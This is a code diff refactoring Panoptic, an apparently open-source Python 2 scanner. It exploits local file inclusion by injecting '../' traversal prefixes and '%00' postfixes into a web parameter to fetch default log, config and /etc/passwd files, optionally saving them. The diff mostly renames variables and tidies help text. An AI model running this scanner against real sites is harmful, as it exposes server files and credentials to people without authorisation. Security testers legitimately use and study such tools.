@@ -1,8 +1,9 @@
 #!/usr/bin/env python
 
 """
-Panoptic:
-Search default file locations for logs and config files.
+Panoptic
+
+Search default file locations through LFI for common log and config files.
 """
 
 import os
@@ -18,6 +19,30 @@ from sys import argv, exit
 NAME = "Panoptic"
 VERSION = "v0.1"
 URL = "https://github.com/lightos/Panoptic/"
+
+# ASCII eye taken from http://www.retrojunkie.com/asciiart/health/eyes.htm
+BANNER = """
+ .-',--.`-.
+<_ | () | _>
+  `-`=='-'
+
+%s %s (%s)
+""" % (NAME, VERSION, URL)
+
+EXAMPLES = """
+Examples:
+./panoptic.py --url "http://localhost/lfi.php?file=test.txt"
+./panoptic.py --url "http://localhost/lfi.php?file=test.txt&id=1" --param file
+./panoptic.py --url "http://localhost/lfi.php" --data "file=test.txt&id=1" --param file
+
+./panoptic.py --list software
+./panoptic.py --list category
+./panoptic.py --list os
+
+./panoptic.py -u "http://localhost/lfi.php?file=test.txt" --os Windows
+./panoptic.py -u "http://localhost/lfi.php?file=test.txt" --software WAMP
+"""
+
 
 class Panoptic:
     """
@@ -70,7 +95,7 @@ class Panoptic:
     def parse_file(self):
         """
         Parses the file locations list.
-        """    
+        """
         for file_location in open("file_locations.txt"):
             if file_location[0] == "\n":
                 self.software = ""
@@ -117,59 +142,47 @@ class Panoptic:
     
     def get_args(self):
         """
-        Parse command line arguements.
+        Parse command line arguments.
         """
-        examples = """
-Examples:
-        
-./panoptic.py --url http://localhost/lfi.php?file=test.txt
-./panoptic.py --url http://localhost/lfi.php?file=test.txt&id=1 --param file
-./panoptic.py --url http://localhost/lfi.php --data "file=test.txt&id=1" --param file
+        OptionParser.format_epilog = lambda self, formatter: self.epilog  # Override epilog formatting
 
-./panoptic.py --list software
-./panoptic.py --list category
-./panoptic.py --list os
-
-./panoptic.py --url http://localhost/lfi.php?file=test.txt --os Windows
-./panoptic.py --url http://localhost/lfi.php?file=test.txt --software WAMP
-"""
-        OptionParser.format_epilog = lambda self, formatter: self.epilog  # Override epilog formatting.
-        parser = OptionParser(usage="usage: %prog --url TARGET [options]", epilog=examples)
+        parser = OptionParser(usage="usage: %prog --url TARGET [options]", epilog=EXAMPLES)
         
         # Required
         parser.add_option("-u", "--url", dest="target",
                   help="set the target to test")
         # Optional
         parser.add_option("-p", "--param", dest="param",
-                  help="set the parameter to test")
+                  help="set parameter name to test for")
         parser.add_option("-d", "--data", dest="data",
                   help="set data for POST request")
         parser.add_option("-o", "--os", dest="os",
-                  help="set an operating system to limit searches to")
+                  help="set operating system to limit searches to")
         parser.add_option("-s", "--software", dest="software",
-                  help="set the name of the software to search for")
+                  help="set name of the software to search for")
         parser.add_option("-c", "--category", dest="category",
-                  help="set a specific category of software to look for")
+                  help="set specific category of software to look for")
         parser.add_option("-t", "--type", dest="classification",
-                  help="set the type of file to search for (conf or log)")
+                  help="set type of file to search for (\"conf\" or \"log\")")
         parser.add_option("-b", "--prefix", dest="prefix", default="",
-                  help="set a prefix for file path (i.e. \"../\")")
+                  help="set prefix for file path (e.g. \"../\")")
         parser.add_option("-e", "--postfix", dest="postfix", default="",
-                  help="set a prefix for file path (i.e. \"%00\")")
+                  help="set prefix for file path (e.g. \"%00\")")
         parser.add_option("-m", "--multiplier", dest="multiplier", type="int", default=1,
-                  help="set a number to multiply the prefix by")
+                  help="set number to multiply the prefix by")
         parser.add_option("-w", "--write-file", dest="write_file", action="store_true",
                   help="write all found files to output folder")
         parser.add_option("-x", "--skip-passwd-test", dest="skip_passwd", action="store_true",
                   help="skip special tests if *NIX passwd file is found")
-        parser.add_option("-l", "--list", help="list the available filters (\"os\", \"category\", \"software\")")
+        parser.add_option("-l", "--list",
+                  help="list available filters (\"os\", \"category\", \"software\")")
         parser.add_option("-v", "--verbose", action="store_true", dest="verbose",
-                          default=False, help="display extra information in the output")
+                  help="display extra information in the output")
 
         self.args = parser.parse_args()[0]
 
         if not self.args.target:
-            parser.error('missing argument for url.')
+            parser.error('missing argument for url. Use -h for help')
             
         if self.args.prefix:
             self.args.prefix = self.args.prefix * self.args.multiplier
@@ -178,24 +191,28 @@ def main():
     """
     Initialize the execution of the program.
     """
-    banner()
-    print("%s\n" % time.strftime("%X"))
-    dfl = Panoptic()
-    dfl.get_args()
-    parsed_url = urlsplit(dfl.args.target)
-    request_params = dfl.args.data if dfl.args.data else parsed_url.query
+    print(BANNER)
+
+    panoptic = Panoptic()
+    panoptic.get_args()
+
+    print("[i] Starting scan at: %s\n" % time.strftime("%X"))
+
+    parsed_url = urlsplit(panoptic.args.target)
+    request_params = panoptic.args.data if panoptic.args.data else parsed_url.query
     
-    if not dfl.args.param:
-        dfl.args.param = re.match("(?P<param>[^=&]+)={1}(?P<value>[^=&]+)", request_params).group(1)
+    if not panoptic.args.param:
+        panoptic.args.param = re.match("(?P<param>[^=&]+)={1}(?P<value>[^=&]+)", request_params).group(1)
 
     def prepare_request(payload):
         """
         Prepare the GET or POST request with the proper payload.
         """
-        armed_query = re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % dfl.args.param,
+        armed_query = re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % panoptic.args.param,
                                 r"\1=%s" % payload, request_params)
         request_args = {"target": "%s://%s%s" % (parsed_url.scheme, parsed_url.netloc, parsed_url.path)}
-        if dfl.args.data:
+
+        if panoptic.args.data:
             request_args["data"] = armed_request
         else:
             request_args["target"] += "?%s" % armed_query
@@ -203,118 +220,111 @@ def main():
         return request_args
 
     print("[*] Checking invalid response...")
+
     request_args = prepare_request("non_existing_file.panoptic")
-    dfl.invalid_response, _ = get_page(**request_args)
+    panoptic.invalid_response, _ = get_page(**request_args)
+
     print("[*] Done!\n")
     print("[*] Initiating file search...")
-    for file in dfl.parse_file():
-        if dfl.args.prefix and dfl.args.prefix[len(dfl.args.prefix)-1] == "/":
-            dfl.args.prefix = dfl.args.prefix[:-1]
 
-        request_args = prepare_request("%s%s%s" % (dfl.args.prefix, file["location"], dfl.args.postfix))
+    for case in panoptic.parse_file():
+        if panoptic.args.prefix and panoptic.args.prefix[len(panoptic.args.prefix)-1] == "/":
+            panoptic.args.prefix = panoptic.args.prefix[:-1]
+
+        request_args = prepare_request("%s%s%s" % (panoptic.args.prefix, case["location"], panoptic.args.postfix))
         html, _ = get_page(**request_args)
         
-        if html != dfl.invalid_response:
-            if not dfl.file_found:
-                dfl.file_found = True
+        if html != panoptic.invalid_response:
+            if not panoptic.file_found:
+                panoptic.file_found = True
                 print("[*] Possible file(s) found!\n")
-                if dfl.operating_system:
-                    print("[*] OS: %s\n" % dfl.operating_system)
-                    
-            print("[+] File: %s" % dfl.file_attributes)
-            
+                if panoptic.operating_system:
+                    print("[*] OS: %s\n" % panoptic.operating_system)
+
+            print("[+] File: %s" % panoptic.file_attributes)
+
             # If --write-file is set.
-            if dfl.args.write_file:
+            if panoptic.args.write_file:
                 if not os.path.exists("output/%s" % parsed_url.netloc): os.makedirs("output/%s" % parsed_url.netloc)
-                with open("output/%s/%s.html" % (parsed_url.netloc, file["location"].replace("/", "_")), "w") as f:
+                with open("output/%s/%s.html" % (parsed_url.netloc, case["location"].replace("/", "_")), "w") as f:
                     f.write(html)
 
             # If --skip-passwd-test not set.
-            #if file["location"] in ("/etc/passwd", "/etc/security/passwd") and not dfl.args.skip_passwd:
+            #if case["location"] in ("/etc/passwd", "/etc/security/passwd") and not panoptic.args.skip_passwd:
             #    users = re.findall("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)
             #    for user in users:
             #        username, password, uid, gid, info, home = user
-                    
-    if not dfl.file_found:
+
+    if not panoptic.file_found:
         print("[*] No files found!")
 
     print("\n[*] File search complete.")
-    print("\n%s\n" % time.strftime("%X"))
+    print("\n[i] Finishing scan at: %s\n" % time.strftime("%X"))
     
 def get_page(**kwargs):
-       """
-       This method retrieves the URL
-       """
-       url = kwargs.get("target", None)
-       post = kwargs.get("data", None)
-       header = kwargs.get("header", None)
-       cookie = kwargs.get("cookie", None)
-       proxy = kwargs.get("proxy", False)
-       user_agent = kwargs.get("user_agent", None)
-       verbose = kwargs.get("verbose", False)
+        """
+        This method retrieves the URL
+        """
+        url = kwargs.get("target", None)
+        post = kwargs.get("data", None)
+        header = kwargs.get("header", None)
+        cookie = kwargs.get("cookie", None)
+        proxy = kwargs.get("proxy", False)
+        user_agent = kwargs.get("user_agent", None)
+        verbose = kwargs.get("verbose", False)
 
-       if url is None:
-           raise Exception("[!] URL cannot be None.")
+        parsed_url = None
+        page = None
 
-       try:
-           parsed_url = urlsplit(url)
-       except:
-           raise Exception("[!] Unable to parse URL: %s" % url)
+        if url is None:
+            raise Exception("[!] URL cannot be None.")
 
-       if proxy:
-           import socks
-           import socket
+        try:
+            parsed_url = urlsplit(url)
+        except:
+            raise Exception("[!] Unable to parse URL: %s" % url)
 
-           proxy = proxy.split(':')
-           ip = proxy[0]
-           port = proxy[1]
-           socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ip, int(port), True)
-           socket.socket = socks.socksocket
+        if proxy:
+            import socks
+            import socket
 
-       if user_agent is None:
-           user_agent = {"user-agent": "%s %s" % (NAME, VERSION)}
-       
-       if post is None:
-           url = "%s://%s%s?%s" % (parsed_url.scheme, parsed_url.netloc, parsed_url.path,
-                                   urlencode(parse_qsl(parsed_url.query)))
-       else:
-           post = urlencode(parse_qsl(post), "POST")
+            proxy = proxy.split(':')
+            ip = proxy[0]
+            port = proxy[1]
+            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ip, int(port), True)
+            socket.socket = socks.socksocket
 
-       # Perform HTTP Request
-       try:
-           headers = user_agent
-           headers["Accept"] = "*"  # Set option to add headers in cmdline
-           req = Request(url, post, headers)
-           conn = urlopen(req)
+        if user_agent is None:
+            user_agent = {"user-agent": "%s %s" % (NAME, VERSION)}
+        
+        if post is None:
+            url = "%s://%s%s?%s" % (parsed_url.scheme, parsed_url.netloc, parsed_url.path,
+                                    urlencode(parse_qsl(parsed_url.query)))
+        else:
+            post = urlencode(parse_qsl(post), "POST")
 
-           # Get HTTP Response
-           page = conn.read()
-           code = conn.code
-           status = conn.msg
-           responseHeaders = conn.info()
+        # Perform HTTP Request
+        try:
+            headers = user_agent
+            headers["Accept"] = "*"  # Set option to add headers in cmdline
 
-       except IOError, e:
-           if hasattr(e, "reason"):
-               if verbose:
-                   print("[!] Error msg: %d" % e.msg)
-                   print("[!] HTTP error code: %d" % e.code)
-                   print("[!] Response headers: %d" % e.info())
-       
-       return page, parsed_url
+            req = Request(url, post, headers)
+            conn = urlopen(req)
 
-def banner():
-    """
-    Prints banner.
-    
-    ASCII eye taken from http://www.retrojunkie.com/asciiart/health/eyes.htm
-    """
-    print("""
- .-',--.`-.
-<_ | () | _>
-  `-`=='-'
+            # Get HTTP Response
+            page = conn.read()
+            code = conn.code
+            status = conn.msg
+            responseHeaders = conn.info()
 
-%s %s
-%s
-""") % (NAME, VERSION, URL)
+        except IOError, e:
+            if hasattr(e, "reason"):
+                if verbose:
+                    print("[!] Error msg: %d" % e.msg)
+                    print("[!] HTTP error code: %d" % e.code)
+                    print("[!] Response headers: %d" % e.info())
+        
+        return page, parsed_url
 
-if __name__ == "__main__": main()
+if __name__ == "__main__":
+    main()
